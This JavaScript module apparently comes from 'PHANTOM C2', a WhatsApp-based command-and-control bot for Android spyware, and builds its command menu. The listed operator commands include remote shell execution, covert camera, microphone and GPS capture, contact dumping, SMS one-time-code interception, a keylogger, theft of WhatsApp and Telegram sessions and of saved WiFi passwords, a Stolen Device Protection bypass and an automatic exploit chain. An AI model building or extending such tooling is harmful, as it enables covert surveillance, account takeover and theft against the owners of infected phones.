export default {
  name: 'menu',
  commands: ['menu', 'help', 'start'],
  handler: async (ctx) => {
    const { sock, jid, getDevices, getTarget } = ctx;
    const devices = getDevices();
    const target = getTarget(jid);
    const targetDevice = target ? devices.find(d => d.device_id === target) : null;
    const status = targetDevice ? (targetDevice.is_online ? '🟢' : '🔴') : '📢';

    const header = target
      ? `🎯 *${target}* ${status}`
      : `📢 *Broadcast Mode*`;

    const menuText = `╔══════════════════════════╗
║   🤖 *PHANTOM C2*       ║
║   ⚡ *6-Proof System*    ║
╚══════════════════════════╝

${header}
📶 Transport: WhatsApp

━━━━━━━━━━━━━━━━━━━━━
*📱 DEVICE CONTROL*
┃ !screenshot — Capture screen
┃ !gps — Device location
┃ !camera — Take photo
┃ !mic — Record audio

*💻 SHELL & COMMANDS*
┃ !shell <cmd> — Execute command
┃ !clipboard — Read clipboard
┃ !notification <text> — Push alert

*🔍 INFORMATION*
┃ !ip — Network info
┃ !sysinfo — System info
┃ !installed — Installed apps
┃ !contacts — Dump contacts
┃ !wifi — WiFi info

*📁 FILES & MEDIA*
┃ !dir <path> — List directory
┃ !download <path> — Get file
┃ !upload <path> — Put file

*💉 EXPLOITS*
┃ !auto_pwn — Auto exploit chain
┃ !exploit list — Show exploits

*🔐 SECURITY*
┃ !encrypt <text> — Encrypt
┃ !decrypt <base64> — Decrypt
┃ !c2 <cmd> — Stealth command

*⚙️ MANAGEMENT*
┃ !devices — List devices
┃ !target <id> — Set target
┃ !untarget — Broadcast mode
┃ !status — Bot health

━━━━━━━━━━━━━━━━━━━━━
Send any command with ! prefix`;

    // Try interactive list first, fall back to text
    try {
      await sock.sendMessage(jid, {
        text: menuText,
        footer: 'Tap to browse',
        title: '☰ COMMAND CENTER',
        buttonText: '📋 MENU',
        sections: [
          {
            title: '📱 DEVICE CONTROL',
            rows: [
              { title: '📸 Screenshot', description: 'Capture device screen', rowId: 'screenshot' },
              { title: '📍 GPS', description: 'Get device location', rowId: 'gps' },
              { title: '📷 Camera', description: 'Take photo (front/back)', rowId: 'camera' },
              { title: '🎙️ Microphone', description: 'Record audio', rowId: 'mic' },
            ]
          },
          {
            title: '💻 SHELL & COMMANDS',
            rows: [
              { title: '💻 Shell <cmd>', description: 'Execute any shell command', rowId: 'shell' },
              { title: '📋 Clipboard', description: 'Read device clipboard', rowId: 'clipboard' },
              { title: '🔔 Notification', description: 'Push notification to device', rowId: 'notification' },
            ]
          },
          {
            title: '🔍 INFORMATION',
            rows: [
              { title: '🌐 IP Info', description: 'Device network info', rowId: 'ip' },
              { title: '⚙️ Sysinfo', description: 'Full system information', rowId: 'sysinfo' },
              { title: '📱 Installed Apps', description: 'List installed packages', rowId: 'installed' },
              { title: '📇 Contacts', description: 'Dump device contacts', rowId: 'contacts' },
              { title: '📡 WiFi', description: 'WiFi networks & info', rowId: 'wifi' },
            ]
          },
          {
            title: '💉 EXPLOITS',
            rows: [
              { title: '🤖 AutoPwn', description: 'Auto-detect + exploit everything', rowId: 'auto_pwn' },
              { title: '💉 Exploit List', description: 'Show available exploits', rowId: 'exploit_list' },
              { title: '🛡️ SDP Bypass', description: 'Android 15 Stolen Device Protection', rowId: 'sdp_bypass' },
              { title: '🔑 OTP Grabber', description: 'Real-time SMS code interception', rowId: 'otp_grabber' },
              { title: '📡 WiFi Passwords', description: 'Extract saved WiFi passwords', rowId: 'wifi_extractor' },
              { title: '🔓 Session Stealer', description: 'Steal WA/Telegram session (root)', rowId: 'session_stealer' },
              { title: '⌨️ Keylogger', description: 'Accessibility keylogger', rowId: 'keylogger' },
              { title: '📱 ADB over WiFi', description: 'Enable remote ADB', rowId: 'adb_wifi' },
            ]
          },
          {
            title: '🔐 SECURITY',
            rows: [
              { title: '🔒 Encrypt Text', description: 'Encrypt a command for stealth C2', rowId: 'encrypt_help' },
              { title: '🔓 Decrypt Response', description: 'Decrypt a C2 response inline', rowId: 'd_help' },
              { title: '💾 Save Auth Backup', description: 'Backup WhatsApp auth to env var', rowId: 'saveauth' },
            ]
          },
          {
            title: '⚙️ MANAGEMENT',
            rows: [
              { title: '📱 Devices', description: 'List all registered devices', rowId: 'devices' },
              { title: '🎯 Target <id>', description: 'Set active target', rowId: 'target' },
              { title: '📢 Untarget', description: 'Switch to broadcast mode', rowId: 'untarget' },
              { title: '📊 Status', description: 'Bot health & stats', rowId: 'status' },
            ]
          }
        ]
      });
    } catch (_) {
      // Fallback: plain text if interactive list fails
      await sock.sendMessage(jid, { text: menuText });
    }
  }
};
